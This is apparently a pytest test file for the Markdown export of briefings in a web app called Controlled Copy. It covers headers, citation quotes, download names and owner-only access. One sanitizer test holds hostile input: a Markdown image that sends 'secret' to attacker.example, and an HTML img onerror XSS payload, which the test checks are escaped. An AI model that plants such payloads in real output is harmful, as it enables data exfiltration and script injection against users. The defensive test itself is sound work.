"""FR-OUT-01 and FR-OUT-02: Studio outputs as Markdown (stage 3)."""

import re

import pytest

from controlled_copy.web.markdown import clean
from tests.conftest import corpus_file

pytestmark = [pytest.mark.api, pytest.mark.stage3]


def briefing_url(visitor) -> tuple[str, dict]:
    visitor.upload("sop.md", corpus_file("SOP-INB-001_inbound-receiving_rev3.md"))
    body = visitor.briefing().json()
    return f"/notebooks/{visitor.notebook_id}/outputs/{body['output_id']}.md", body["output"]


def test_tc_out_001_a_briefing_exports_with_every_quote(visitor):
    url, output = briefing_url(visitor)
    response = visitor.client.get(url)
    assert response.status_code == 200
    assert response.headers["content-type"] == "text/markdown; charset=utf-8"
    assert response.headers["cache-control"] == "no-store"
    text = response.text
    assert text.startswith("# Briefing\n")
    for section in output["sections"]:
        assert f"## {section['title']}" in text
    for citation in output["citations"]:
        quote = " ".join(citation["quote"].split())
        assert f"[{citation['n']}] " in text and f'"{quote}"' in text, "every verified quote is listed"
    assert "Made with Controlled Copy." in text
    page = visitor.refresh().page
    assert f'data-copy-markdown="{url}"' in page and f'href="{url}?download=true"' in page


def test_tc_out_001_download_names_the_file(visitor):
    url, _ = briefing_url(visitor)
    response = visitor.client.get(url + "?download=true")
    assert response.headers["content-disposition"].startswith('attachment; filename="briefing-')


def test_tc_out_002_only_the_owner_can_export(visitor, make_visitor):
    url, _ = briefing_url(visitor)
    other = make_visitor()
    assert other.client.get(url).status_code == 404
    assert visitor.client.get(url.replace(".md", "x.md")).status_code == 404
    anonymous = make_visitor(login=False)
    assert anonymous.client.get(url, follow_redirects=False).status_code in (303, 401, 403)


def test_tc_out_002_a_removed_output_is_not_exported(visitor):
    url, _ = briefing_url(visitor)
    visitor.client.delete(f"/sources/{visitor.sources[0]}", headers=visitor.json_headers())
    assert visitor.client.get(url).status_code == 404


def test_tc_out_001_text_cannot_render_links_images_or_html():
    hostile = "See ![x](https://attacker.example/?d=secret) and <img src=x onerror=alert(1)> *now*"
    escaped = clean(hostile)
    for char in "[]<>*":
        assert re.search(rf"(?<!\\){re.escape(char)}", escaped) is None, f"unescaped {char!r} in {escaped}"
    assert escaped.startswith("See !\\[x\\](https://attacker.example/?d=secret)")
